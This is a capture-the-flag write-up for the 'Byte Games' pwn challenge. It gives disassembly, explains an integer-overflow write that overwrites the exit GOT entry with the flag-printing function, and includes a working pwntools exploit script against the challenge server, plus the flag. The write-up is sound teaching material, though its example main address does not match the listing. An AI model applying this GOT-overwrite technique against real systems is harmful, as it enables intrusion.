# Byte Games (800 points / 4 solves)

Ryuk's Mathematics basics are very clear. He knows that upon adding 2 positive numbers, you are always going to end up with another positive number. Quite obvious right...However you, being the elite hacker that you have become, are going to find some workaround in this and a possible loophole to try and ensure that you can use your skills and mettle to bend the rules of Mathematics itself and in doing so, make a fool of Ryuk himself. Ryuk likes to be proven wrong. So, if you are able to successfully execute your Byte Games on Ryuk and prove him wrong...then who knows...There's a high chance that he will allow you to write a name of your own choice in the infamous DEATH NOTE!! Now that's an opportunity that I would never let go. Would you?? Lets find out!

Attempt your Byte Games on Ryuk and Demonstrate your hacking prowess here:

nc 165.232.176.84 31685

## Overview

In this challenge, the goal is to perform a ret2win exploit by overwriting the GOT entry for exit with the address of the function `deathNote`. The program asks for two numbers, which, when combined, give an offset that allows writing over memory addresses. By crafting specific values for these numbers, we can overwrite the GOT entry for `exit`, allowing us to control program execution and call `deathNote`, which prints the flag.

```asm
0x00401030    1      6 sym.imp.putchar
0x00401040    1      6 sym.imp.strcpy
0x00401050    1      6 sym.imp.puts
0x00401060    1      6 sym.imp.__stack_chk_fail
0x00401070    1      6 sym.imp.printf
0x00401080    1      6 sym.imp.fgets
0x00401090    1      6 sym.imp.fflush
0x004010a0    1      6 sym.imp.fopen
0x004010b0    1      6 sym.imp.__isoc99_scanf
0x004010c0    1      6 sym.imp.exit
0x004010d0    1     33 entry0
0x00401110    4     31 sym.deregister_tm_clones
0x00401140    4     49 sym.register_tm_clones
0x00401180    3     32 sym.__do_global_dtors_aux
0x004011b0    1      6 sym.frame_dummy
0x00401570    1      9 sym._fini
0x004012a3    5    203 sym.death_note
0x004011b6    1    237 sym.banner
0x0040136e    1    153 sym.writeNote
0x00401100    1      1 sym._dl_relocate_static_pie
0x00401407    6    359 main
0x00401000    3     23 sym._init
```

```asm
            ; DATA XREF from entry0 @ 0x4010e4(r)
            ; DATA XREF from main @ 0x4014e8(r)
┌ 359: int main (int argc, char **argv);
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; var int64_t var_8h @ rbp-0x8
│           ; var int64_t var_10h @ rbp-0x10
│           ; var uint32_t var_14h @ rbp-0x14
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_1ch @ rbp-0x1c
│           ; var int64_t var_24h @ rbp-0x24
│           ; var char **var_30h @ rbp-0x30
│           0x00401407      55             push rbp
│           0x00401408      4889e5         mov rbp, rsp
│           0x0040140b      4883ec30       sub rsp, 0x30
│           0x0040140f      897ddc         mov dword [var_24h], edi    ; argc
│           0x00401412      488975d0       mov qword [var_30h], rsi    ; argv
│           0x00401416      b800000000     mov eax, 0
│           0x0040141b      e896fdffff     call sym.banner
│           0x00401420      488d053013..   lea rax, str._nEnter_your_first_number: ; 0x402757 ; "\nEnter your first number: "
│           0x00401427      4889c7         mov rdi, rax                ; const char *format
│           0x0040142a      b800000000     mov eax, 0
│           0x0040142f      e83cfcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401434      488b05252c..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404060:8]=0                                                                                                           
│           0x0040143b      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040143e      e84dfcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401443      488d45e4       lea rax, [var_1ch]
│           0x00401447      4889c6         mov rsi, rax
│           0x0040144a      488d052113..   lea rax, [0x00402772]       ; "%d"
│           0x00401451      4889c7         mov rdi, rax                ; const char *format
│           0x00401454      b800000000     mov eax, 0
│           0x00401459      e852fcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040145e      488d051013..   lea rax, str._nEnter_the_second_number: ; 0x402775 ; "\nEnter the second number: "
│           0x00401465      4889c7         mov rdi, rax                ; const char *format
│           0x00401468      b800000000     mov eax, 0
│           0x0040146d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401472      488b05e72b..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404060:8]=0                                                                                                           
│           0x00401479      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040147c      e80ffcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401481      488d45e8       lea rax, [var_18h]
│           0x00401485      4889c6         mov rsi, rax
│           0x00401488      488d05e312..   lea rax, [0x00402772]       ; "%d"
│           0x0040148f      4889c7         mov rdi, rax                ; const char *format
│           0x00401492      b800000000     mov eax, 0
│           0x00401497      e814fcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040149c      8b45e4         mov eax, dword [var_1ch]
│           0x0040149f      85c0           test eax, eax
│       ┌─< 0x004014a1      7807           js 0x4014aa
│       │   0x004014a3      8b45e8         mov eax, dword [var_18h]
│       │   0x004014a6      85c0           test eax, eax
│      ┌──< 0x004014a8      792d           jns 0x4014d7
│      ││   ; CODE XREF from main @ 0x4014a1(x)
│      │└─> 0x004014aa      488d05df12..   lea rax, str._nDont_try_to_be_so_smart...Itll_cost_you ; 0x402790 ; "\nDon't try to be so smart...It'll cost you"
│      │    0x004014b1      4889c7         mov rdi, rax                ; const char *format
│      │    0x004014b4      b800000000     mov eax, 0
│      │    0x004014b9      e8b2fbffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x004014be      488b059b2b..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│      │                                                               ; [0x404060:8]=0                                                                                                           
│      │    0x004014c5      4889c7         mov rdi, rax                ; FILE *stream
│      │    0x004014c8      e8c3fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│      │    0x004014cd      bf00000000     mov edi, 0                  ; int status
│      │    0x004014d2      e8e9fbffff     call sym.imp.exit           ; void exit(int status)
│      │    ; CODE XREF from main @ 0x4014a8(x)
│      └──> 0x004014d7      8b55e4         mov edx, dword [var_1ch]
│           0x004014da      8b45e8         mov eax, dword [var_18h]
│           0x004014dd      01d0           add eax, edx
│           0x004014df      8945ec         mov dword [var_14h], eax
│           0x004014e2      837dec00       cmp dword [var_14h], 0
│       ┌─< 0x004014e6      795e           jns 0x401546
│       │   0x004014e8      488d0518ff..   lea rax, [main]             ; 0x401407
│       │   0x004014ef      488945f0       mov qword [var_10h], rax
│       │   0x004014f3      8b45ec         mov eax, dword [var_14h]
│       │   0x004014f6      f7d8           neg eax
│       │   0x004014f8      4863d0         movsxd rdx, eax
│       │   0x004014fb      488b45f0       mov rax, qword [var_10h]
│       │   0x004014ff      4801d0         add rax, rdx
│       │   0x00401502      488945f8       mov qword [var_8h], rax
│       │   0x00401506      488d05ae12..   lea rax, str._nWoah__You_proved_Ryuk_wrong_ ; 0x4027bb ; "\nWoah! You proved Ryuk wrong!"
│       │   0x0040150d      4889c7         mov rdi, rax                ; const char *format
│       │   0x00401510      b800000000     mov eax, 0
│       │   0x00401515      e856fbffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0040151a      488d05bf12..   lea rax, str._nIn_return__he_has_allowed_you_to_write_a_name_at_a_certain_note_address_in_the_Death_Note ; 0x4027e0 ; "\nIn return, he has allowed you to write a name at a certain note address in the Death Note"                                                                                                                                      
│       │   0x00401521      4889c7         mov rdi, rax                ; const char *s
│       │   0x00401524      e827fbffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x00401529      488b05302b..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│       │                                                              ; [0x404060:8]=0                                                                                                           
│       │   0x00401530      4889c7         mov rdi, rax                ; FILE *stream
│       │   0x00401533      e858fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│       │   0x00401538      488b45f8       mov rax, qword [var_8h]
│       │   0x0040153c      4889c7         mov rdi, rax                ; int64_t arg1
│       │   0x0040153f      e82afeffff     call sym.writeNote
..
│      ││   ; CODE XREF from main @ 0x4014e6(x)
│      │└─> 0x00401546      488d05f312..   lea rax, str._nDid_you_really_think_that_you_could_fool_Ryuk__ ; 0x402840 ; "\nDid you really think that you could fool Ryuk?!"
│      │    0x0040154d      4889c7         mov rdi, rax                ; const char *format
│      │    0x00401550      b800000000     mov eax, 0
│      │    0x00401555      e816fbffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x0040155a      488b05ff2a..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│      │                                                               ; [0x404060:8]=0                                                                                                           
│      │    0x00401561      4889c7         mov rdi, rax                ; FILE *stream
│      │    0x00401564      e827fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│      │    ; CODE XREF from main @ +0x13d(x)
│      └──> 0x00401569      b800000000     mov eax, 0
│           0x0040156e      c9             leave
└           0x0040156f      c3             ret
```

```asm
            ; CALL XREF from main @ 0x40153f(x)
┌ 153: sym.writeNote (char *arg1); // noreturn
│           ; arg char *arg1 @ rdi
│           ; var int64_t var_8h @ rbp-0x8
│           ; var char *src @ rbp-0x20
│           ; var char *dest @ rbp-0x28
│           0x0040136e      55             push rbp
│           0x0040136f      4889e5         mov rbp, rsp
│           0x00401372      4883ec30       sub rsp, 0x30
│           0x00401376      48897dd8       mov qword [dest], rdi       ; arg1
│           0x0040137a      64488b0425..   mov rax, qword fs:[0x28]
│           0x00401383      488945f8       mov qword [var_8h], rax
│           0x00401387      31c0           xor eax, eax
│           0x00401389      488d054813..   lea rax, str._nEnter_the_name_of_the_person__whom_you_wish_to_kill__in_the_Death_Note: ; 0x4026d8 ; "\nEnter the name of the person, whom you wish to kill, in the Death Note: "                                                                                                                                                                         
│           0x00401390      4889c7         mov rdi, rax                ; const char *format
│           0x00401393      b800000000     mov eax, 0
│           0x00401398      e8d3fcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040139d      488b05bc2c..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404060:8]=0                                                                                                           
│           0x004013a4      4889c7         mov rdi, rax                ; FILE *stream
│           0x004013a7      e8e4fcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x004013ac      488d45e0       lea rax, [src]
│           0x004013b0      4889c6         mov rsi, rax
│           0x004013b3      488d056813..   lea rax, str._20s           ; 0x402722 ; "%20s"
│           0x004013ba      4889c7         mov rdi, rax                ; const char *format
│           0x004013bd      b800000000     mov eax, 0
│           0x004013c2      e8e9fcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004013c7      488d55e0       lea rdx, [src]
│           0x004013cb      488b45d8       mov rax, qword [dest]
│           0x004013cf      4889d6         mov rsi, rdx                ; const char *src
│           0x004013d2      4889c7         mov rdi, rax                ; char *dest
│           0x004013d5      e866fcffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x004013da      488d054713..   lea rax, str._nName_written_in_the_Death_Note_successfully__ ; 0x402728 ; "\nName written in the Death Note successfully!!"
│           0x004013e1      4889c7         mov rdi, rax                ; const char *format
│           0x004013e4      b800000000     mov eax, 0
│           0x004013e9      e882fcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004013ee      488b056b2c..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404060:8]=0                                                                                                           
│           0x004013f5      4889c7         mov rdi, rax                ; FILE *stream
│           0x004013f8      e893fcffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x004013fd      bf00000000     mov edi, 0                  ; int status
└           0x00401402      e8b9fcffff     call sym.imp.exit           ; void exit(int status)
```

```asm
┌ 203: sym.death_note ();
│           ; var int64_t canary @ rbp-0x8
│           ; var char *format @ rbp-0x90
│           ; var file*stream @ rbp-0x98
│           0x004012a3      55             push rbp
│           0x004012a4      4889e5         mov rbp, rsp
│           0x004012a7      4881eca000..   sub rsp, 0xa0
│           0x004012ae      64488b0425..   mov rax, qword fs:[0x28]
│           0x004012b7      488945f8       mov qword [canary], rax
│           0x004012bb      31c0           xor eax, eax
│           0x004012bd      488d058413..   lea rax, [0x00402648]       ; "r"
│           0x004012c4      4889c6         mov rsi, rax                ; const char *mode
│           0x004012c7      488d057c13..   lea rax, str.flag.txt       ; 0x40264a ; "flag.txt"
│           0x004012ce      4889c7         mov rdi, rax                ; const char *filename
│           0x004012d1      e8cafdffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x004012d6      48898568ff..   mov qword [stream], rax
│           0x004012dd      4883bd68ff..   cmp qword [stream], 0
│       ┌─< 0x004012e5      7519           jne 0x401300
│       │   0x004012e7      488d056a13..   lea rax, str._nThere_is_no_flag.txt_present_in_this_directory._Create_a_sample_flag.txt_for_local_exploitation. ; 0x402658 ; "\nThere is no 'flag.txt' present in this directory. Create a sample flag.txt for local exploitation."                                                                                                                      
│       │   0x004012ee      4889c7         mov rdi, rax                ; const char *s
│       │   0x004012f1      e85afdffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x004012f6      bf00000000     mov edi, 0                  ; int status
│       │   0x004012fb      e8c0fdffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.death_note @ 0x4012e5(x)
│       └─> 0x00401300      488b9568ff..   mov rdx, qword [stream]     ; FILE *stream
│           0x00401307      488d8570ff..   lea rax, [format]
│           0x0040130e      be80000000     mov esi, 0x80               ; 128 ; int size
│           0x00401313      4889c7         mov rdi, rax                ; char *s
│           0x00401316      e865fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x0040131b      488d059a13..   lea rax, str._nHeres_to_another_DEATH__ ; 0x4026bc ; "\nHere's to another DEATH!!"
│           0x00401322      4889c7         mov rdi, rax                ; const char *s
│           0x00401325      e826fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040132a      488d8570ff..   lea rax, [format]
│           0x00401331      4889c7         mov rdi, rax                ; const char *format
│           0x00401334      b800000000     mov eax, 0
│           0x00401339      e832fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040133e      bf0a000000     mov edi, 0xa                ; int c
│           0x00401343      e8e8fcffff     call sym.imp.putchar        ; int putchar(int c)
│           0x00401348      488b05112d..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404060:8]=0                                                                                                           
│           0x0040134f      4889c7         mov rdi, rax                ; FILE *stream
│           0x00401352      e839fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00401357      90             nop
│           0x00401358      488b45f8       mov rax, qword [canary]
│           0x0040135c      64482b0425..   sub rax, qword fs:[0x28]
│       ┌─< 0x00401365      7405           je 0x40136c
│       │   0x00401367      e8f4fcffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from sym.death_note @ 0x401365(x)
│       └─> 0x0040136c      c9             leave
└           0x0040136d      c3             ret
```

From the program, we can conclude that after integer overflowing' the main() function, we get to the writeNote() function from where we can return to the death_note() function and get the flag.

## Vulnerability

The program asks for two numbers, number1 and number2, and calculates an address using the formula:

`address_to_write = main - (number1 + number2)`

This calculation results in the program writing to a specific memory address based on the values of `number1` and `number2`. The vulnerability arises because we can control this memory write and target the GOT entry for `exit`, allowing us to overwrite it with the address of `deathNote`, which prints the flag.

Memory Layout:

main function address: the start of the main function in the binary.

exit@GOT: the address of the exit function's GOT entry.

deathNote: the address of the function that prints the flag.

We need to calculate number1 and number2 such that the sum of the two numbers gives us an offset from main to exit@GOT. Specifically, we want:

`-(number1 + number2) = exit@GOT - main`

## Exploit

To exploit this, we need to:

1) Find the offset from main to exit@GOT.
2) Choose `number1` and `number2` such that their sum produces this offset.
3) Overwrite the GOT entry for exit with the address of deathNote.
   
Step 1: Calculate the Offset
We disassemble the binary and calculate the offset between main and exit@GOT. From the binary analysis:

  a) `main` function address: The program's main function starts at a certain address, say 0x4011a0 (you can find this using GDB or objdump).
  
  b) `exit@GOT` address: The GOT entry for exit is at 0x404048.

`offset = exit@GOT - main`
and by using this with the formula above, we get the 2nd number as `2147472320` and 1st num as `2147483647`

Step 2: Overwrite the GOT Entry
Now that we have the correct `number1` and `number2`, we can use the program's logic to calculate an address that points to `exit@GOT`. We then overwrite `exit@GOT` with the address of `deathNote`.

```py
from pwn import *

context.binary = elf = ELF("./bytegames")
#io = process()
io = remote("165.232.176.84", 31685)

io.recvuntil("Enter your first number: ")
io.sendline("2147483647")

io.recvuntil("Enter the second number: ")
io.sendline("2147472320")


io.recvuntil("Enter the name of the person, whom you wish to kill, in the Death Note: ")

payload = p64(0x4012a3)
io.sendline(payload)

io.interactive()
```

`BsidesDehradun{D34tH_1s_0nLy_Th3_Beg1nNing_191cdae0ef1}`
